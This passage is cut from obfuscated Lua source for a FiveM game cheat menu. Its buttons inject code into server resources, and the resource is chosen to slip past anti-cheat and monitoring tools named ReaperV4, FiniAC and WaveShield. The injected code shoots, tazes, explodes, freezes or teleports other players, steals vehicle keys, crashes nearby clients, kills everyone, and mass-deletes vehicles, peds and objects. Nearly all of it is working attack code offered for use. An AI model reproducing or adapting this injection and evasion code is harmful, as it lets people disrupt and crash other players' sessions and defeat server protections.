                        local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                        if not pEd or not DoesEntityExist(pEd) then return end

                        local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                        local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                        QwErTyUiOpAsDfGh(
                            oRiGiN.x, oRiGiN.y, oRiGiN.z,
                            tArGeT.x, tArGeT.y, tArGeT.z,
                            500.0,
                            true,
                            GetHashKey("WEAPON_ASSAULTRIFLE"),
                            PlayerPedId(),
                            true,
                            false,
                            -1.0
                        )
                    end)
                end

                UiLpKjHgFdSaTrEq()
            ]]):format(v182));end end);MachoMenuButton(v40[1 + 0 ],"Taze Player",function() local v183=523 -(423 + 100) ;local v184;while true do if (v183==(0 + 0)) then v184=MachoMenuGetSelectedPlayer();if (v184 and (v184>(0 -0))) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function UiLpKjHgFdSaTrEq()
                    local RvTyUiOpAsDfGhJ = %d

                    local dFrTgYhUjIkLoPl = CreateThread
                    dFrTgYhUjIkLoPl(function()
                        Wait(0)

                        local ZxCvBnMaSdFgTrEq = GetPlayerPed
                        local TyUiOpAsDfGhJkLz = GetEntityCoords
                        local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                        local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                        if not pEd or not DoesEntityExist(pEd) then return end

                        local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                        local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                        QwErTyUiOpAsDfGh(
                            oRiGiN.x, oRiGiN.y, oRiGiN.z,
                            tArGeT.x, tArGeT.y, tArGeT.z,
                            0,
                            true,
                            GetHashKey("WEAPON_STUNGUN"),
                            PlayerPedId(),
                            true,
                            false,
                            -1.0
                        )
                    end)
                end

                UiLpKjHgFdSaTrEq()
            ]]):format(v184));end break;end end end);MachoMenuButton(v40[1 + 0 ],"Explode Player",function() local v185=771 -(326 + 445) ;local v186;while true do if (v185==(0 -0)) then v186=MachoMenuGetSelectedPlayer();if (v186 and (v186>(0 -0))) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,([[
                local function TzYuIoPlMnBvCxZa()
                    local iOpAsDfGhJkLzXcV = %d

                    local ZqWeRtYuIoPlMnB = CreateThread
                    ZqWeRtYuIoPlMnB(function()
                        Wait(0)

                        local jBtWxFhPoZuR = GetPlayerPed
                        local mWjErTbYcLoU = GetEntityCoords
                        local aSdFgTrEqWzXcVb = AddExplosion

                        local pEd = jBtWxFhPoZuR(iOpAsDfGhJkLzXcV)
                        if not pEd or not DoesEntityExist(pEd) then return end

                        local coords = mWjErTbYcLoU(pEd)
                        aSdFgTrEqWzXcVb(coords.x, coords.y, coords.z, 6, 10.0, true, false, 1.0)
                    end)
                end

                TzYuIoPlMnBvCxZa()
            ]]):format(v186));end break;end end end);MachoMenuButton(v40[2 -1 ],"Give All Nearby Objects",function() local v187=MachoMenuGetSelectedPlayer();if (v187 and (v187>(711 -(530 + 181)))) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,([[
                local function TzYuIoPlMnBvCxZa()
                    local xWcErTvBnMzLp = %d

                    local aGhJkLpOiUyTr = _G.GetPlayerPed
                    local bUiOpLkJhGfDs = _G.DoesEntityExist
                    local cPzWsXcEdCvBnM = _G.GetEntityCoords
                    local dRtYuIoPlMnBgF = _G.SetEntityCoords
                    local eAsDfGhJkLqWe = _G.RequestControlOfEntity or RequestCtrlOverEntity
                    local fZxCvBnMqWeRt = _G.NetworkRequestControlOfEntity
                    local gXcVbNmZqWeRt = _G.SetEntityAsMissionEntity

                    local function iRequest(obj)
                        fZxCvBnMqWeRt(obj)
                        eAsDfGhJkLqWe(obj)
                        gXcVbNmZqWeRt(obj, true, true)
                    end

                    CreateThread(function()
                        Wait(0)

                        local targetPed = aGhJkLpOiUyTr(xWcErTvBnMzLp)
                        if not bUiOpLkJhGfDs(targetPed) then return end
                        local coords = cPzWsXcEdCvBnM(targetPed)

                        for obj in EnumerateObjects() do
                            if bUiOpLkJhGfDs(obj) then
                                iRequest(obj)
                                dRtYuIoPlMnBgF(obj, coords.x, coords.y, coords.z, false, false, false, false)
                            end
                        end
                    end)
                end

                TzYuIoPlMnBvCxZa()

            ]]):format(v187));end end);MachoMenuButton(v40[882 -(614 + 267) ],"Teleport To Player",function() local v188=MachoMenuGetSelectedPlayer();if (v188 and (v188>(32 -(19 + 13)))) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function GhJkUiOpLzXcVbNm()
                    local kJfHuGtFrDeSwQa = %d
                    local oXyBkVsNzQuH = GetPlayerPed
                    local zXcVbNmQwErTyUi = GetEntityCoords
                    local xAsDfGhJkLpOiU = SetEntityCoords

                    local myPed = PlayerPedId()
                    local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                    local targetCoords = zXcVbNmQwErTyUi(targetPed)

                    xAsDfGhJkLpOiU(myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                end

                GhJkUiOpLzXcVbNm()
            ]]):format(v188));end end);MachoMenuButton(v40[1 -0 ],"Kick From Vehicle",function() local v189=MachoMenuGetSelectedPlayer();if (v189 and (v189>(0 -0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function GhJkUiOpLzXcVbNm()
                    local kJfHuGtFrDeSwQa = %d
                    local oXyBkVsNzQuH = _G.GetPlayerPed
                    local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                    local wQeRtYuIoPlMn = _G.PlayerPedId
                    local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                    local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                    local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                    local veh = yZaSdFgHjKlQ(targetPed, 0)

                    local function nMzXcVbNmQwErTy(func, ...)
                        local _print = print
                        local function errorHandler(ex)
                            -- _print("SCRIPT ERROR: " .. ex)
                        end

                        local argsStr = ""
                        for _, v in ipairs({...}) do
                            if type(v) == "string" then
                                argsStr = argsStr .. "\"" .. v .. "\", "
                            elseif type(v) == "number" or type(v) == "boolean" then
                                argsStr = argsStr .. tostring(v) .. ", "
                            else
                                argsStr = argsStr .. tostring(v) .. ", "
                            end
                        end
                        argsStr = argsStr:sub(1, -3)

                        local script = string.format("return func(%%s)", argsStr)
                        local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                        if not fn then
                            -- _print("Error loading script: " .. err)
                            return nil
                        end

                        local success, result = xpcall(function() return fn() end, errorHandler)
                        if not success then
                            -- _print("Error executing script: " .. result)
                            return nil
                        else
                            return result
                        end
                    end

                    if veh ~= 0 then
                        Wait(100)
                        nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                        ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                        
                        Wait(100)
                        nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                    end
                end

                GhJkUiOpLzXcVbNm()
            ]]):format(v189));end end);MachoMenuButton(v40[2 -1 ],"Freeze Player",function() local v190=MachoMenuGetSelectedPlayer();if (v190 and (v190>(0 + 0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function VtQzAfXyYu()
                    local RqTfBnLpZo = %d
                    local FgTrLpYwVs = GetPlayerPed
                    local EoKdCjXqMg = GetEntityCoords
                    local ZbLpVnXwQr = GetClosestVehicle
                    local WqErTyUiOp = PlayerPedId
                    local AsDfGhJkLz = SetPedIntoVehicle
                    local PoLiKjUhYg = ClearPedTasks
                    local QwErTyUiOp = NetworkRequestControlOfEntity
                    local CxZvBnMaSd = GetGameTimer
                    local VcMnBgTrEl = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local wfjaw4dtdu = CreateThread
                    local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                    local tgtCoords = EoKdCjXqMg(tgtPed)
                    local veh = cHvBzNtEkQ(tgtCoords, 150.0, 0, 70)

                    if not veh or veh == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    QwErTyUiOp(veh)
                    Wait(100)
                    AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                    VcMnBgTrEl(200)
                    PoLiKjUhYg(WqErTyUiOp())

                    wfjaw4dtdu(function()
                        local start = CxZvBnMaSd()
                        while CxZvBnMaSd() - start < 3000 do
                            TeAxSpDoMj(
                                veh,
                                tgtPed,
                                0.0, 0.0, 10.0,
                                10.0, 0.0, 0.0,
                                true, 0, 0,
                                false, false, 0
                            )
                            VcMnBgTrEl(0)
                        end
                    end)
                end

                VtQzAfXyYu()
            ]]):format(v190));end end);MachoMenuButton(v40[1],"Glitch Player",function() local v191=0 -0 ;local v192;while true do if (v191==(0 -0)) then v192=MachoMenuGetSelectedPlayer();if (v192 and (v192>(1812 -(1293 + 519)))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function TnXmLoPrVq()
                    local kPdZoWxNq = %d

                    local LsKjHgFdSa = GetPlayerPed
                    local ZxCvBnMaQw = GetEntityCoords
                    local QtRvBnPoLs = GetClosestVehicle
                    local VcBgTrElMn = PlayerPedId
                    local KdJfGhTyPl = SetPedIntoVehicle
                    local TrLkUyIoPl = ClearPedTasks
                    local MwZlQxNsTp = NetworkRequestControlOfEntity
                    local AsYtGhUiMn = GetGameTimer
                    local WqErTyUiOp = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local CrXeTqLpVi = CreateThread

                    local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                    local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                    local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                    if not jCaBnErYqK or jCaBnErYqK == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    MwZlQxNsTp(veh)
                    Wait(100)
                    KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                    WqErTyUiOp(200)
                    TrLkUyIoPl(VcBgTrElMn())

                    CrXeTqLpVi(function()
                        local tGhXpLsMkA = AsYtGhUiMn()
                        local bErXnPoVlC = 3000

                        while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                            TeAxSpDoMj(
                                jCaBnErYqK,
                                xGyPtMdLoB,
                                0, 0, 0,
                                2000.0, 1460.928, 1000.0,
                                10.0, 88.0, 600.0,
                                true, true, true, false, 0
                            )
                            WqErTyUiOp(0)
                        end
                    end)
                end

                TnXmLoPrVq()
            ]]):format(v192));end break;end end end);MachoMenuButton(v40[1 -0 ],"Limbo Player",function() local v193=0 -0 ;local v194;while true do if ((0 -0)==v193) then v194=MachoMenuGetSelectedPlayer();if (v194 and (v194>0)) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function VyTxQzWsCr()
                    local lDxNzVrMpY = %d

                    local FgTrLpYwVs = GetPlayerPed
                    local EoKdCjXqMg = GetEntityCoords
                    local ZbLpVnXwQr = GetClosestVehicle
                    local WqErTyUiOp = PlayerPedId
                    local AsDfGhJkLz = SetPedIntoVehicle
                    local PoLiKjUhYg = ClearPedTasks
                    local QwErTyUiOp = NetworkRequestControlOfEntity
                    local CxZvBnMaSd = GetGameTimer
                    local VcMnBgTrEl = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local CrXeTqLpVi = CreateThread

                    local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                    local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                    local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                    if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    QwErTyUiOp(veh)
                    Wait(100)
                    AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                    VcMnBgTrEl(200)
                    PoLiKjUhYg(WqErTyUiOp())

                    CrXeTqLpVi(function()
                        local kYqPmTnVzL = CxZvBnMaSd()
                        local yTbQrXlMwA = 3000
                        local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                        while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                            TeAxSpDoMj(
                                cHvBzNtEkQ,
                                vUpYrTnMwE,
                                0, 0, 0,
                                hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                                true, true, true, true, 0
                            )
                            VcMnBgTrEl(0)
                        end
                    end)
                end

                VyTxQzWsCr()
            ]]):format(v194));end break;end end end);MachoMenuButton(v40[4 -3 ],"Copy Appearance",function() local v195=0;local v196;while true do if (v195==(0 -0)) then v196=MachoMenuGetSelectedPlayer();if (v196 and (v196>(0 + 0))) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function AsDfGhJkLqWe()
                    local ZxCvBnMqWeRt = %d
                    local UiOpAsDfGhJk = GetPlayerPed
                    local QwErTyUiOpAs = PlayerPedId
                    local DfGhJkLqWeRt = DoesEntityExist
                    local ErTyUiOpAsDf = ClonePedToTarget

                    local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                    if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                        local YpAsDfGhJkLq = QwErTyUiOpAs()
                        ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                    end
                end

                AsDfGhJkLqWe()
            ]]):format(v196));end break;end end end);MachoMenuButton(v40[1],"Steal Keys",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local ped = GetPlayerPed(-1)
     local veh = GetVehiclePedIsIn((ped), true)  
     local plate = GetVehicleNumberPlateText(veh)
     TriggerEvent('vehiclekeys:client:SetOwner',plate)
        ]]);end);MachoMenuButton(v40[1 + 1 ],"Crash Nearby [Don't Spam]",function() MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("FiniAC") and "FiniAC") or (v48("WaveShield") and "WaveShield") or (v48("monitor") and "monitor") or "any" ,[[
            local function sfehwq34rw7td()
                local Nwq7sd2Lkq0pHkfa = CreateThread
                Nwq7sd2Lkq0pHkfa(function()
                    local hAx9qTeMnb = CreateThread
                    local Jf9uZxcTwa = _G.CreatePed           -- Creates a pedestrian (NPC)
                    local VmzKo3sRt7 = _G.PlayerPedId         -- Gets the player's ped ID
                    local LuZx8nqTys = _G.GetEntityCoords     -- Gets entity coordinates
                    local QksL02vPdt = _G.GetEntityHeading    -- Gets entity heading
                    local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset -- Sets entity coordinates
                    local PfQsXoEr6b = _G.GiveWeaponToPed    -- Gives a weapon to a ped
                    local WvNay7Zplm = _G.TaskParachute       -- Makes a ped use a parachute
                    local DjRq08bKxu = _G.FreezeEntityPosition -- Freezes entity position
                    local EkLnZmcTya = _G.GetHashKey         -- Gets a model hash key
                    local YdWxVoEna3 = _G.RequestModel       -- Requests a model to load
                    local GcvRtPszYp = _G.HasModelLoaded     -- Checks if a model is loaded
                    local MnVc8sQaLp = _G.SetEntityAsMissionEntity -- Marks entity as mission-related
                    local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded -- Frees model from memory
                    local VdNzWqbEyf = _G.DoesEntityExist    -- Checks if an entity exists
                    local AxWtRuLskz = _G.DeleteEntity       -- Deletes an entity
                    local OplKvms9te = _G.Wait               -- Pauses execution for a specified time
                    local BnQvKdsLxa = _G.GetGroundZFor_3dCoord -- Gets ground Z-coordinate
                    local VmxrLa9Ewt = _G.ApplyForceToEntity -- Applies force to an entity
                    local fwafWAefAg = _G.SetEntityVisible   -- Sets entity visibility
                    local awrt325etd = _G.SetBlockingOfNonTemporaryEvents -- Blocks non-temporary events
                    local awfaw4eraq = _G.SetEntityAlpha     -- Sets entity transparency

                    hAx9qTeMnb(function()
                        -- Get the player's ped and its coordinates/heading
                        local QxoZnmWlae = VmzKo3sRt7() -- Player's ped
                        local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae) -- Player's coordinates
                        local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae) -- Player's heading
                        local ZtXmqLpEas = EzPwqLtYas.z + 1600.0 -- Set Z-coordinate 1600 units above

                        -- Teleport player to high altitude
                        Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

                        -- Apply downward force to simulate falling
                        VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                        -- Wait 250ms to allow the fall to start
                        OplKvms9te(250)

                        -- Freeze player in place
                        DjRq08bKxu(QxoZnmWlae, true)

                        -- Equip player with a parachute
                        PfQsXoEr6b(QxoZnmWlae, "gadget_parachute", 1, false, true)
                        WvNay7Zplm(QxoZnmWlae, false) -- Trigger parachute task

                        -- Freeze player again to prevent movement
                        DjRq08bKxu(QxoZnmWlae, true)

                        -- Load the "player_one" (Franklin) model
                        local UixZpvLoa9 = EkLnZmcTya("player_one")
                        YdWxVoEna3(UixZpvLoa9)
                        -- Wait until the model is loaded
                        while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

                        -- Create a table to store created peds
                        local TzsPlcxQam = {}
                        -- Spawn 130 invisible peds at the player's location
                        for K9wo = 1, 130 do
                            local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                            if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                                MnVc8sQaLp(IuxErv7Pqa, true, true) -- Mark ped as mission entity
                                awrt325etd(IuxErv7Pqa, true) -- Block non-temporary events
                                awfaw4eraq(IuxErv7Pqa, 0, true) -- Make ped invisible
                                table.insert(TzsPlcxQam, IuxErv7Pqa) -- Store ped in table
                            end
                            OplKvms9te(1) -- Small delay to prevent freezing
                        end

                        -- Release the model from memory
                        KrXpTuwq9c(UixZpvLoa9)

                        -- Wait 300ms before cleaning up
                        OplKvms9te(300)

                        -- Delete all created peds (repeated calls may be for reliability)
                        for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                            if VdNzWqbEyf(bTzyPq7Xsl) then
                                AxWtRuLskz(bTzyPq7Xsl) -- Repeated deletion attempts
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                            end
                        end

                        -- Unfreeze the player
                        DjRq08bKxu(QxoZnmWlae, false)

                        -- Find the ground Z-coordinate at the player's location
                        local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
                        if not ZkxyPqtLs0 then
                            Zfound = EzPwqLtYas.z -- Fallback to current Z if ground not found
                        end

                        -- Wait 1 second before teleporting
                        OplKvms9te(1000)

                        -- Teleport player to just above ground level
                        Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                        DjRq08bKxu(QxoZnmWlae, true) -- Freeze player briefly
                        DjRq08bKxu(QxoZnmWlae, false) -- Unfreeze player
                    end)
                end)
            end

            -- Execute the main function
            sfehwq34rw7td()
        ]]);end);MachoMenuButton(v40[4 -2 ],"Cone Everyone",function() local v197=0;local v198;local v199;local v200;while true do if ((0 + 0)==v197) then v198=GetHashKey("prop_roadcone02a");RequestModel(v198);v197=1 + 0 ;end if ((1 + 0)==v197) then while  not HasModelLoaded(v198) do Wait(0);end v199=nil;v197=1098 -(709 + 387) ;end if (v197==(1862 -(673 + 1185))) then for v340,v341 in ipairs(v200) do if  not IsPedAPlayer(v341) then v199(v341);end end break;end if (v197==3) then for v342,v343 in ipairs(GetActivePlayers()) do v199(GetPlayerPed(v343));end v200=(GetGamePool and GetGamePool("CPed")) or {} ;v197=11 -7 ;end if (v197==2) then function v199(v344) local v345=0 -0 ;local v346;local v347;local v348;while true do if (v345==(0 -0)) then if ( not DoesEntityExist(v344) or IsEntityDead(v344)) then return;end v346=GetEntityCoords(v344);v345=1 + 0 ;end if (v345==(1 + 0)) then v347=CreateObject(v198,v346.x,v346.y,v346.z,true,true,false);SetEntityAsMissionEntity(v347,true,true);v345=2 -0 ;end if (v345==(1 + 3)) then AttachEntityToEntity(v347,v344,v348,0,0,0.25 -0 ,0,0,0,false,false,true,false,3 -1 ,true);break;end if (v345==3) then SetEntityCanBeDamaged(v347,false);v348=GetPedBoneIndex(v344,32966 -(446 + 1434) );v345=4;end if (2==v345) then SetEntityCollision(v347,false,false);SetEntityInvincible(v347,true);v345=3;end end end v199(PlayerPedId());v197=3;end end end);MachoMenuButton(v40[1285 -(1040 + 243) ],"Explode All Players",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function fGhJkLpOiUzXcVb()
                local aSdFgHjKlQwErTy = GetActivePlayers
                local pOiUyTrEeRwQtYy = DoesEntityExist
                local mNbVcCxZzLlKkJj = GetEntityCoords
                local hGjFkDlSaPwOeIr = AddOwnedExplosion
                local tYuIoPaSdFgHjKl = PlayerPedId

                local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
                for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                    local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                    if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                        local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                        hGjFkDlSaPwOeIr(
                            tYuIoPaSdFgHjKl(),
                            nMzXcVbNmQwErTy.x,
                            nMzXcVbNmQwErTy.y,
                            nMzXcVbNmQwErTy.z,
                            6,     -- Explosion type
                            1.0,   -- Damage scale
                            true,  -- Audible
                            false, -- Invisible
                            0.0    -- Camera shake
                        )
                    end
                end
            end

            fGhJkLpOiUzXcVb()
        ]]);end);MachoMenuButton(v40[5 -3 ],"Explode All Vehicles",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function uYhGtFrEdWsQaZx()
                local rTyUiOpAsDfGhJk = GetGamePool
                local xAsDfGhJkLpOiUz = DoesEntityExist
                local cVbNmQwErTyUiOp = GetEntityCoords
                local vBnMkLoPiUyTrEw = AddOwnedExplosion
                local nMzXcVbNmQwErTy = PlayerPedId

                local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
                local me = nMzXcVbNmQwErTy()
                for _, veh in ipairs(_vehicles) do
                    if xAsDfGhJkLpOiUz(veh) then
                        local pos = cVbNmQwErTyUiOp(veh)
                        vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                    end
                end
            end
            uYhGtFrEdWsQaZx()
        ]]);end);MachoMenuButton(v40[1849 -(559 + 1288) ],"Delete All Vehicles",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zXcVbNmQwErTyUi()
                local aSdFgHjKlQwErTy = GetGamePool
                local pOiUyTrEeRwQtYy = DoesEntityExist
                local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
                local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
                local tYuIoPaSdFgHjKl = DeleteEntity
                local yUiOpAsDfGhJkLz = PlayerPedId
                local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
                local gJkLoPiUyTrEqWe = GetGameTimer
                local fDeSwQaZxCvBnMm = Wait

                local me = yUiOpAsDfGhJkLz()
                local myVeh = uIoPaSdFgHjKlQw(me, false)

                local vehicles = aSdFgHjKlQwErTy("CVehicle")
                for _, veh in ipairs(vehicles) do
                    if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                        mNbVcCxZzLlKkJj(veh)
                        local timeout = gJkLoPiUyTrEqWe() + 500
                        while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                            fDeSwQaZxCvBnMm(0)
                        end
                        if hGjFkDlSaPwOeIr(veh) then
                            tYuIoPaSdFgHjKl(veh)
                        end
                    end
                end
            end
            zXcVbNmQwErTyUi()
        ]]);end);MachoMenuButton(v40[1933 -(609 + 1322) ],"Delete All Peds",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qWeRtYuIoPlMnBv()
                local zXcVbNmQwErTyUi = GetGamePool
                local aSdFgHjKlQwErTy = DoesEntityExist
                local pOiUyTrEeRwQtYy = DeleteEntity
                local mNbVcCxZzLlKkJj = PlayerId
                local hGjFkDlSaPwOeIr = GetPlayerPed
                local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
                local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
                local uIoPaSdFgHjKlQw = GetGameTimer
                local gJkLoPiUyTrEqWe = Wait
                local vBnMkLoPiUyTrEw = IsPedAPlayer

                local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
                local peds = zXcVbNmQwErTyUi("CPed")

                for _, ped in ipairs(peds) do
                    if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                        tYuIoPaSdFgHjKl(ped)
                        local timeout = uIoPaSdFgHjKlQw() + 500
                        while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                            gJkLoPiUyTrEqWe(0)
                        end
                        if yUiOpAsDfGhJkLz(ped) then
                            pOiUyTrEeRwQtYy(ped)
                        end
                    end
                end
            end
            qWeRtYuIoPlMnBv()
        ]]);end);MachoMenuButton(v40[456 -(13 + 441) ],"Delete All Objects",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function mNqAzXwSeRdTfGy()
                local rTyUiOpAsDfGhJk = GetGamePool
                local xAsDfGhJkLpOiUz = DoesEntityExist
                local cVbNmQwErTyUiOp = DeleteEntity
                local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
                local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
                local yUiOpAsDfGhJkLz = GetGameTimer
                local uIoPaSdFgHjKlQw = Wait

                local objects = rTyUiOpAsDfGhJk("CObject")
                for _, obj in ipairs(objects) do
                    if xAsDfGhJkLpOiUz(obj) then
                        vBnMkLoPiUyTrEw(obj)
                        local timeout = yUiOpAsDfGhJkLz() + 500
                        while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                            uIoPaSdFgHjKlQw(0)
                        end
                        if nMzXcVbNmQwErTy(obj) then
                            cVbNmQwErTyUiOp(obj)
                        end
                    end
                end
            end
            mNqAzXwSeRdTfGy()
        ]]);end);MachoMenuButton(v40[7 -5 ],"ShowIDs [New Feature]",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local displayIDs = false -- toggles both self + nearby IDs

    function DrawText3D(x, y, z, text)
        local onScreen, _x, _y = World3dToScreen2d(x, y, z)
        if onScreen then
            SetTextFont(0)
            SetTextProportional(1)
            SetTextScale(0.5, 0.5)
            SetTextColour(255, 255, 255, 255)
            SetTextEntry("STRING")
            AddTextComponentString(text)
            DrawText(_x, _y)
        end
    end

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            -- Toggle both IDs with E
            if IsControlJustPressed(0, 38) then
                displayIDs = not displayIDs
            end

            if displayIDs then
                -- Draw own ID
                local playerId = GetPlayerServerId(PlayerId())
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.3, 0.3)
                SetTextColour(255, 255, 255, 255)
                SetTextEntry("STRING")
                AddTextComponentString("Your Player ID: " .. playerId)
                DrawText(0.5, 0.1)

                -- Draw nearby players' IDs
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                local players = GetActivePlayers()

                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local dist = #(playerCoords - targetCoords)

                        if dist < 40.0 then
                            local targetId = GetPlayerServerId(player)
                            DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "ID: " .. targetId)
                        end
                    end
                end
            end
        end
    end)
        ]]);end);MachoMenuCheckbox(v40[5 -3 ],"Kill Everyone",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
            aSwDeFgHiJkLoPx = true

            local function pLoMkIjUhbGyTf()
                local mAxPlErOy = PlayerPedId()
                local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
                local gBvTnCuXe = 100
                local aSdFgHjKl = 1000.0
                local lKjHgFdSa = 300.0

                local nBxMzLqPw = CreateThread
